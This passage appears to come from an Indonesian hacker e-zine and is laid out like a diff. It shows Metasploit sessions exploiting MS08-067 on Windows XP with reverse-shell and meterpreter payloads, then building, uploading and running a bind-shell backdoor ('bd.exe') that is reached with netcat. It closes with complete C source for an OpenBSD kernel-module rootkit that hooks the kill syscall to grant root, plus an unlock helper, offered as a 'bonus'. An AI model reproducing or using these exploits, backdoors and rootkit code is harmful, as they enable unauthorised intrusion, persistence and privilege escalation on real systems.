+firewall yang sangat paranoid, gunakan payload shell reverse tcp.
+
+staff@eleet:~/Hack/metasploit$ sudo hping -A 172.16.11.248 -c 2 -p 4444
+HPING 172.16.11.248 (wlan0 172.16.11.248): A set, 40 headers + 0 data
+bytes
+
+--- 172.16.11.248 hping statistic ---
+2 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 172.16.11.248
+RHOST => 172.16.11.248
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell_reverse_tcp 
+PAYLOAD => windows/shell_reverse_tcp
+msf exploit(ms08_067_netapi) > set LHOST 172.16.11.180
+LHOST => 172.16.11.180
+msf exploit(ms08_067_netapi) > show options
+
+Module options:
+
+   Name     Current Setting  Required  Description                             
+   ----     ---------------  --------  -----------                             
+   RHOST    172.16.11.248    yes       The target address                      
+   RPORT    445              yes       Set the SMB service port                
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER,SRVSVC)  
+
+
+Payload options (windows/shell_reverse_tcp):
+
+   Name      Current Setting  Required  Description                           
+   ----      ---------------  --------  -----------                           
+   EXITFUNC  thread           yes       Exit technique: seh, thread,process  
+   LHOST     172.16.11.180    yes       The local address                     
+   LPORT     4444             yes       The local port                        
+
+
+Exploit target:
+
+   Id  Name                 
+   --  ----                 
+   0   Automatic Targeting  
+
+
+msf exploit(ms08_067_netapi) > exploit
+[*] Started reverse handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP Service Pack 2 - lang:English
+[*] Selected Target: Windows XP SP2 English (NX)
+[*] Triggering the vulnerability...
+[*] Command shell session 4 opened (172.16.11.180:4444 ->172.16.11.248:1767)
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+Pada target yang bersistem operasi windows, attacker juga bisa
+memanfaatkan meterpreter untuk menggaining akses pada mesin yang
+vulnerable. Dengan memanfaatkan meterpreter attacker bisa mengupload
+sembarang file kemudian mengeksekusinya. Attacker bisa saja mengupload
+file backdoor kemudian mengeksekusinya ditarget.
+
+staff@eleet$ ./msfpayload windows/shell_bind_tcp LPORT=31337 \
+> EXITFUNC=thread X > bd.exe
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/shell_bind_tcp
+ Length: 317
+Options: LPORT=31337,EXITFUNC=thread
+staff@eleet$ ls -l bd.exe 
+-rw-r--r--  1 staff  staff  9728 Dec 29 01:18 bd.exe
+staff@eleet$ file bd.exe
+bd.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit
+staff@eleet$
+
+msf exploit(ms08_067_netapi) > show options
+
+Module options:
+
+   Name     Current Setting  Required  Description                             
+   ----     ---------------  --------  -----------                             
+   RHOST    192.168.132.130  yes       The target address                      
+   RPORT    445              yes       Set the SMB service port                
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER,SRVSVC)  
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting Required  Description                           
+   ----      --------------- --------  -----------                           
+   DLL       /home/staff/Hack/meta/data/meterpreter/metsrv.dll  
+   yes	     The local path to the DLL to upload   
+   EXITFUNC  thread 	     yes       Exit technique: seh, thread, process  
+   LHOST     192.168.132.1   yes       The local address                     
+   LPORT     31337	     yes       The local port                        
+
+Exploit target:
+
+   Id  Name                 
+   --  ----                 
+   0   Automatic Targeting  
+
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Handler binding to LHOST 192.168.132.1
+[*] Started reverse handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP Service Pack 2 - lang:English
+[*] Selected Target: Windows XP SP2 English (NX)
+[*] Triggering the vulnerability...
+[*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+[*] Sending stage (2650 bytes)
+[*] Sleeping before handling stage...
+[*] Uploading DLL (75787 bytes)...
+[*] Upload completed.
+[*] Meterpreter session 1 opened (192.168.132.1:31337 -> 192.168.132.130:1038)
+
+
+
+meterpreter > cd c:\
+
+meterpreter > upload bd.exe
+[*] uploading  : bd.exe -> bd.exe
+[*] uploaded   : bd.exe -> bd.exe
+
+meterpreter > ls
+
+Listing: c:\
+============
+
+Mode              Size       Type  Last modified                   Name                       
+----              ----       ----  -------------                   ----                       
+100777/rwxrwxrwx  0          fil   Thu Jan 01 03:00:00 +0300 1970  AUTOEXEC.BAT               
+100666/rw-rw-rw-  0          fil   Thu Jan 01 03:00:00 +0300 1970  CONFIG.SYS                 
+40777/rwxrwxrwx   0          dir   Thu Jan 01 03:00:00 +0300 1970  Documents and Settings     
+100444/r--r--r--  0          fil   Thu Jan 01 03:00:00 +0300 1970  IO.SYS                     
+100444/r--r--r--  0          fil   Thu Jan 01 03:00:00 +0300 1970  MSDOS.SYS                  
+100555/r-xr-xr-x  47564      fil   Thu Jan 01 03:00:00 +0300 1970  NTDETECT.COM               
+40555/r-xr-xr-x   0          dir   Thu Jan 01 03:00:00 +0300 1970  Program Files              
+40777/rwxrwxrwx   0          dir   Thu Jan 01 03:00:00 +0300 1970  Python25
+40777/rwxrwxrwx   0          dir   Thu Jan 01 03:00:00 +0300 1970  System Volume Information  
+40777/rwxrwxrwx   0          dir   Thu Jan 01 03:00:00 +0300 1970  WINDOWS                    
+100777/rwxrwxrwx  9728       fil   Thu Jan 01 03:00:00 +0300 1970  bd.exe                     
+100444/r--r--r--  211        fil   Thu Jan 01 03:00:00 +0300 1970  boot.ini                   
+100444/r--r--r--  250032     fil   Thu Jan 01 03:00:00 +0300 1970  ntldr                      
+100666/rw-rw-rw-  805306368  fil   Thu Jan 01 03:00:00 +0300 1970  pagefile.sys               
+40777/rwxrwxrwx   0          dir   Thu Jan 01 03:00:00 +0300 1970  temp                       
+
+ 
+meterpreter > execute -f bd.exe
+Process 1812 created.
+meterpreter > ps
+
+Process list
+============
+
+    PID   Name               Path                                                    
+    ---   ----               ----                                                    
+    224   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe  
+    380   smss.exe           \SystemRoot\System32\smss.exe                           
+    628   winlogon.exe       \??\C:\WINDOWS\system32\winlogon.exe                    
+    672   services.exe       C:\WINDOWS\system32\services.exe                        
+    684   lsass.exe          C:\WINDOWS\system32\lsass.exe                           
+    836   vmacthlp.exe       C:\Program Files\VMware\VMware Tools\vmacthlp.exe       
+    852   svchost.exe        C:\WINDOWS\system32\svchost.exe                         
+    880   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe  
+    1028  svchost.exe        C:\WINDOWS\System32\svchost.exe                         
+    1156  logon.scr          C:\WINDOWS\System32\logon.scr                           
+    1200  wuauclt.exe        C:\WINDOWS\system32\wuauclt.exe                         
+    1224  wscntfy.exe        C:\WINDOWS\system32\wscntfy.exe                         
+    1492  Explorer.EXE       C:\WINDOWS\Explorer.EXE                                 
+    1560  spoolsv.exe        C:\WINDOWS\system32\spoolsv.exe                         
+    1640  VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe     
+    1648  VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe     
+    1780  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe  
+    1812  bd.exe             c:\bd.exe
+
+/* Connect from other machine */
+
+staff@eleet$ nc 192.168.132.130 31337
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+c:\>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.132.130
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.132.2
+
+c:\>
+
+
+
+Thiz lamme tutorial is dedicated to so many kiddiez in Indonesia. They
+always said "Jebol server pake exploit port uda ga jaman lagi, ribet
+firewall ma IDS. Enakan SQL injection, RFI, dan web hacking lain". Sure!
+you're right with ur opinion, ur opinion which tell us that you know
+nothing. You don't know how to play with firewall, how to evade the IDS, 
+how to fool with da shellc0de, how to deal with da protocol. 
+
+
+
+######################################################################
+        -- [0x07] --  Share C0de - OpenBSD LKM Root Backdoor
+######################################################################
+
+So, th1z is ur bonus for new year hackin' h0ney!
+
+x---------------------------x el8root.c x-----------------------------x
+
+/*
+OpenBSD root shell with LKM - kecoak-elektronik
+Sure, th1z idea has been exist for long time ago.
+THC has given us nice tutorial about FreeBSD LKM
+infoshacker/france and securitylab.ru has given
+us nice tutorial about OpenBSD LKM
+We just rewrite for u with some modificationz
+Nothing's new but still nice enough!
+Compile :
+cc -D_KERNEL -I/sys -c el8root.c
+Load to kernel:
+modload -o trojan.out -etrojan el8root.o
+*/
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#define UIDMAGIC 1003
+#define SIGNALMAGIC 60
+
+//we don't use sys/syscalargs.h
+struct sys_kill_args {
+        int pid;
+        int signum;
+};
+
+int (*orig_kill)(struct proc *p, void *v, register_t *retval);
+int my_kill(struct proc *p, void *v, register_t *retval);
+
+MOD_MISC("trojan");
+
+int my_kill(struct proc *p, void *v, register_t *retval) {
+  struct sys_kill_args *args;
+  struct proc* ourp;
+  
+  args = (struct sys_kill_args*)v;
+  struct pcred *pc = p->p_cred;  
+
+  //We use cr_uid=0 means euid user 0
+  //but uid=MAGICUID
+  //Why??because we can take some advantages of th1z
+  //I think thiz link will usefull for u
+  //http://ftp.fr.openbsd.org/pub/OpenBSD/src/sys/kern/kern_prot.c
+
+  if(args->signum == SIGNALMAGIC){
+    ourp = (pfind(args->pid));
+    ourp->p_cred->pc_ucred->cr_uid = 0;
+    ourp->p_cred->pc_ucred->cr_gid = 0;
+  
+    *retval = -EINVAL;
+    return -EINVAL;
+  }else{
+    return orig_kill(p,v,retval);
+  }
+  
+}
+
+int handler (struct lkm_table * lkmtp, int cmd) {
+switch(cmd)
+{
+case LKM_E_LOAD:
+  //printf("syscall's modified\n");
+  (sy_call_t *)orig_kill = sysent[SYS_kill].sy_call;
+  sysent[SYS_kill].sy_call = (sy_call_t *)my_kill;
+  break;
+
+case LKM_E_UNLOAD:
+  //printf("change to default syscall\n");
+  sysent[SYS_kill].sy_call = (sy_call_t *)orig_kill;
+break;
+
+case LKM_E_STAT:
+  //printf("syscall's already changed .\n"); 
+  break; 
+} 
+return 0; 
+}
+
+int trojan (struct lkm_table * lkmtp, int cmd, int ver) 
+{
+  DISPATCH(lkmtp, cmd, ver, handler, handler, lkm_nofunc); 
+}
+
+x----------------------------x unlock.c x-----------------------------x
+
+/*
+Unlock user with UIDMAGIC to root
+Compile:
+ cc -o unlock unlock.c
+Unlock:
+ ./unlock $$
+*/
+#include <signal.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+  if(argc<2)return -1;
+  return kill(atoi(argv[1]),60);
+}
+
+x--------------------------x end of zine x----------------------------x
+
+
+-- [3] -- Close Wordz
+
+You might try to restrict information, but technology enables us to
+stand as equals! Open your eyes..
+
